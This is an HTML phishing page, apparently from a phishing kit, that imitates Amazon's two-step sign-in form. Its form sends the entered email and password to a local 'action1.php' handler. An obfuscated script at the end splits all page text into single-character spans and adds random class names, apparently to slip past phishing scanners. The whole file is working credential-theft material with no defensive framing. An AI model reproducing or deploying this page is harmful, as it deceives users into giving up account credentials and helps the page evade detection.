<!DOCTYPE html>
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


    <title>Amazon Sign-In</title>
    <link rel="shortcut icon" href="./files/favicon.ico">
    <link rel="stylesheet" href="./files/sign-dekstop.css">
    <link rel="stylesheet" href="./files/style.sign-desktop.css">
</head>

<body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate" cz-shortcut-listen="true" style="">
    <div id="a-page">
        <div class="a-section a-padding-medium auth-workflow">
            <div class="a-section a-spacing-none auth-navbar">
                <div class="a-section a-spacing-medium a-text-center">
                    <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                </div>
            </div>
            <div id="authportal-center-section" class="a-section">
                <div class="a-section a-spacing-base auth-pagelet-container badInput hide">
                    <div class="a-section">
                        <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">There was a problem</h4> <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                        <li><span class="a-list-item"> We cannot find an account with that email address </span> </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="a-section auth-pagelet-container">
                    <div class="a-section a-spacing-base">
                        <div class="a-section">
                            <form name="signIn" method="post" action="./action1.php" id="konzform" class="auth-validate-form auth-real-time-validation a-spacing-none" onsubmit="return checkpass();">
                                <div class="a-section">
                                    <div class="a-box" id="emailpage">
                                        <div class="a-box-inner a-padding-extra-large">
                                            <h1 class="a-spacing-small"> Sign-In </h1>
                                            <div class="a-row a-spacing-base">
                                                <label for="ap_email" class="a-form-label">
                                                    Email or mobile phone number                                                </label>
                                                <input type="text" maxlength="128" id="ap_email" name="emailLogin" class="a-input-text a-span12 auth-autofocus auth-required-field formemail">
                                                <style>
                                                    .show {
                                                        display: block;
                                                    }
                                                </style>
                                                <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert">
                                                    <div class="a-box-inner a-alert-container"> <i class="a-icon a-icon-alert"></i>
                                                        <div class="a-alert-content">
                                                            Enter your email or mobile phone number                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="a-section"> <span id="continue" class="a-button a-button-span12 a-button-primary"> <span class="a-button-inner"> <input id="btnContinue" class="a-button-input" type="submit" onclick="return showPass();"> <span id="continue-announce" class="a-button-text" aria-hidden="true">Continue</span> </span>
                                                </span>
                                                <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
                                                    By continuing, you agree to Amazon's                                                    <a href="/signin?verify=cr51_b2641166c73e337822bc28e52a4abdf2#">
                                                        Conditions of Use                                                    </a>
                                                    and                                                    <a href="/signin?verify=cr51_b2641166c73e337822bc28e52a4abdf2#">
                                                        Privacy Notice                                                    </a>.
                                                </div>
                                            </div>
                                            <div class="a-section">
                                                <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}" data-csa-c-id="hfxg3d-82z4jc-u21hge-jjzkib"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
                                                        Need help?                                                    </span></a>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="a-box hide" id="passpage">
                                        <div class="a-box-inner a-padding-extra-large">
                                            <h1 class="a-spacing-small"> Sign-In </h1>
                                            <div class="a-row a-spacing-base"> <span id="emailsgin"></span>
                                                <a id="ap_change_login_claim" class="a-link-normal" value="Refresh" onclick="history.go(0)">
                                                    Change                                                </a>
                                            </div>
                                            <div class="a-section">
                                                <div class="a-section a-spacing-large">
                                                    <div class="a-row">
                                                        <div class="a-column a-span5">
                                                            <label for="ap_password" class="a-form-label">
                                                                Password                                                            </label>
                                                        </div>
                                                        <div class="a-column a-span7 a-text-right a-span-last">
                                                            <a id="auth-fpp-link-bottoms" class="a-link-normal" tabindex="3" href="/signin?verify=cr51_b2641166c73e337822bc28e52a4abdf2#">
                                                                Forgot your password?                                                            </a>
                                                        </div>
                                                    </div>
                                                    <input type="password" maxlength="1024" id="ap_password" name="passwordLogin" tabindex="2" class="a-input-text a-span12 auth-autofocus auth-required-field formpassword">
                                                    <div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini passnull" aria-live="assertive" role="alert">
                                                        <div class="a-box-inner a-alert-container"> <i class="a-icon a-icon-alert"></i>
                                                            <div class="a-alert-content">
                                                                Enter your password                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="a-section"> <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true"> Sign-In </span></span>
                                                    </span>
                                                    <div class="a-row a-spacing-top-medium">
                                                        <div class="a-section a-text-left">
                                                            <label for="auth-remember-me" class="a-form-label">
                                                                <div data-a-input-name="rememberMe" class="a-checkbox">
                                                                    <label>
                                                                        <input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label"> Keep me signed in. <span class="a-declarative"> <a id="remember_me_learn_more_link" href="javascript:void(0)" class="a-popover-trigger a-declarative"> Details <i class="a-icon a-icon-popover"></i></a> </span> </span>
                                                                    </label>
                                                                </div>
                                                            </label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="a-divider-sprite2" id="data-sprite">
                            <div class="a-divider a-divider-break">
                                <h5>New to Amazon?</h5>
                            </div><span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" href="/signin?verify=cr51_b2641166c73e337822bc28e52a4abdf2#" class="a-button-text" role="button"> Create your Amazon account </a></span></span>
                        </div>
                    </div>
                </div>
            </div>
            <div id="right-2"> </div>
            <div class="a-section a-spacing-top-extra-large auth-footer">
                <div class="a-divider a-divider-section">
                    <div class="a-divider-inner"></div>
                </div>
                <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal">
                        Conditions of Use                    </a> <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal">
                        Privacy Notice                    </a> <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal">
                        Help                    </a> <span class="auth-footer-seperator"></span>
                </div>
                <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> © 1996-2024, Amazon.com, Inc. or its affiliates </span> </div>
            </div>
        </div>
        <script src="./files/jquery-3.3.1.min.js"></script>
        <script src="./files/jquery.validate.min.js"></script>
        <script>
            $(document).ready(function() {
                $("form").submit(function() {
                    $(this).submit(function() {
                       
                    });
                    
                });
            });
            $('input[name=emailLogin]').on('keyup', function() {
                $('#emailsgin').html($(this).val());
            });

            $('#ap_password').on('keyup', function(s) {
                if (13 == s.keyCode) $('#signInSubmit').click();
            });

            let showPass = () => {
                let ap_email = $('#ap_email').val();

                if (ap_email.length == '') {
                    $('.auth-inlined-error-message').addClass('show');
                    $('.formemail').addClass('a-form-error');
                    return true;
                } else if (!ap_email.match(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/)) {
                    $('.formemail').addClass('a-form-error');
                    $('.badInput').removeClass('hide');
                    return true;
                } else {
                    $('.formemail').removeClass('a-form-error');
                    $('.passnull').removeClass('show');
                    $('#btncontinue').addClass('hide');
                    $('.badInput').addClass('hide');
                    $('#emailpage').addClass('hide');
                    $('#data-sprite').addClass('hide');
                    $('#passpage').removeClass('hide');
                    return false;
                }
            }

            let checkpass = () => {
                let ap_password = $('#ap_password').val();

                if (ap_password.length < 6) {
                    $('.passnull').addClass('show');
                    $('.formpassword').addClass('show');
                    return false;
                } else {
                    $('.passnull').removeClass('show');
                    $('.formpassword').removeClass('show');
                }
            }
        </script>

<script>
const _0x5531de=_0x32fa;(function(_0x35c1e4,_0x1a4d60){const _0x28ef65=_0x32fa,_0x4f4892=_0x35c1e4();while(!![]){try{const _0x497bef=parseInt(_0x28ef65(0xeb))/0x1*(-parseInt(_0x28ef65(0xdd))/0x2)+-parseInt(_0x28ef65(0xd5))/0x3*(parseInt(_0x28ef65(0xcf))/0x4)+parseInt(_0x28ef65(0xe5))/0x5*(-parseInt(_0x28ef65(0xe9))/0x6)+-parseInt(_0x28ef65(0xdb))/0x7+parseInt(_0x28ef65(0xe2))/0x8+parseInt(_0x28ef65(0xea))/0x9+parseInt(_0x28ef65(0xd3))/0xa;if(_0x497bef===_0x1a4d60)break;else _0x4f4892['push'](_0x4f4892['shift']());}catch(_0x51db2c){_0x4f4892['push'](_0x4f4892['shift']());}}}(_0x26b5,0x5a002));function modifyTextContent(_0x48aa73){const _0x221720=_0x32fa,_0x3be6fe=_0x48aa73[_0x221720(0xdf)];for(let _0x971bfb=0x0;_0x971bfb<_0x3be6fe[_0x221720(0xd4)];_0x971bfb++){const _0x25c4e2=_0x3be6fe[_0x971bfb];if(_0x25c4e2[_0x221720(0xdc)]===Node[_0x221720(0xd7)]){const _0x264242=_0x25c4e2[_0x221720(0xd2)]['trim']();if(_0x264242){const _0x142bba=[..._0x264242][_0x221720(0xde)](_0xec071f=>'<span>'+_0xec071f+_0x221720(0xe7))[_0x221720(0xe4)]('');_0x25c4e2[_0x221720(0xd0)](...parseHTML(_0x142bba));}}else _0x25c4e2['nodeType']===Node[_0x221720(0xd6)]&&modifyTextContent(_0x25c4e2);}const _0x933f30=String['fromCharCode'](0x41+Math[_0x221720(0xe1)](Math[_0x221720(0xd9)]()*0x1a)),_0x189ec5=Math[_0x221720(0xe1)](Math[_0x221720(0xd9)]()*0x1e),_0x37e935=String['fromCharCode'](0x41+Math[_0x221720(0xe1)](Math['random']()*0x1a)),_0x4c0973=Math[_0x221720(0xe1)](Math[_0x221720(0xd9)]()*0x1e),_0x1ea6c3=String['fromCharCode'](0x41+Math[_0x221720(0xe1)](Math[_0x221720(0xd9)]()*0x1a)),_0x229b09=Math[_0x221720(0xe1)](Math['random']()*0x1e);_0x48aa73[_0x221720(0xe8)]['add']('class-'+_0x933f30+_0x189ec5+_0x221720(0xe3)+_0x37e935+_0x4c0973+'-class-'+_0x1ea6c3+_0x229b09);}function _0x32fa(_0x3e3adc,_0x538d06){const _0x26b536=_0x26b5();return _0x32fa=function(_0x32fa2c,_0x417787){_0x32fa2c=_0x32fa2c-0xcf;let _0x5f0e89=_0x26b536[_0x32fa2c];return _0x5f0e89;},_0x32fa(_0x3e3adc,_0x538d06);}function parseHTML(_0x20c44d){const _0x594668=_0x32fa,_0x37bd40=document[_0x594668(0xd8)](_0x594668(0xd1));return _0x37bd40['innerHTML']=_0x20c44d,_0x37bd40[_0x594668(0xda)][_0x594668(0xdf)];}function _0x26b5(){const _0x57bda7=['floor','5267512LYrQoD','-class-','join','640580dHpeZO','querySelectorAll','</span>','classList','30fwUbVh','5361291IiAQsw','4CTmZIM','7428wRbMjb','replaceWith','template','textContent','8870720vLzTXr','length','810uGYmbh','ELEMENT_NODE','TEXT_NODE','createElement','random','content','103222lJlQNo','nodeType','307926QUITrM','map','childNodes','h1,h2,h3,h4,h5,h6,p,span,strong,em,a,ul,ol,li,dl,dt,dd,blockquote,cite,code,pre,abbr,del,ins,sup,sub,mark,small,big,u,s,b,i,br,hr,hgroup,address,time,q,cite,dfn,var,kbd,samp,meter,progress,figure,figcaption,table,caption,thead,tbody,tfoot,th,td,tr,colgroup,col,div,section,article,nav,header,footer,main,aside,iframe,select,option,label,fieldset,legend,textarea,button,form,input,optgroup,map,area,details,summary,menu,command,output,progress,keygen,datalist,audio,video,source,track,canvas,meter,time,mark,ruby,rt,rp,bdi,bdo,wbr,picture,source,img,figcaption,path,circle,ellipse,polygon,polyline,rect,text,line,g,iframe,embed,object,param,link,meta,base'];_0x26b5=function(){return _0x57bda7;};return _0x26b5();}const allElements=document[_0x5531de(0xe6)](_0x5531de(0xe0));allElements['forEach'](_0x523931=>{modifyTextContent(_0x523931);});
</script>
</div></body></html>